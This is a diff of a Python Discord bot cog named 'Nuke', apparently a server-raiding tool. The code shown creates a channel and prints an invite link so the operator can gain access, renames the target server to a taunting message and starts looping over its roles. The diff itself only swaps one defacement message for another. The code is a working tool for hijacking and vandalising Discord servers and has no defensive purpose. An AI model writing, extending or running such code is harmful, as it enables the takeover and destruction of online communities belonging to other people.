@@ -14,7 +14,7 @@ class Nuke(commands.Cog):
                 await ctx.guild.create_text_channel(f'fuckme1')
                 invite = await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                 print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Invite: {str(invite)} :)')
-                await ctx.guild.edit(name="NOX WAS HERE")
+                await ctx.guild.edit(name=":} Send me a message to get me back to life :}")
                 print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Changed server name :)')
                 for c in ctx.guild.roles:
                     try:
@@ -53,7 +53,7 @@ class Nuke(commands.Cog):
                 await guild.create_text_channel(f'fuckme1')
                 invite = await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                 print(f'Guild: {guild.name} - {str(guild.id)} - Invite: {str(invite)} :)')
-                await guild.edit(name="NOX WAS HERE")
+                await guild.edit(name=":} Send me a message to get me back to life :}")
                 print(f'Guild: {guild.name} - {str(guild.id)} - Changed server name :)')
                 for c in guild.roles:
                     try:
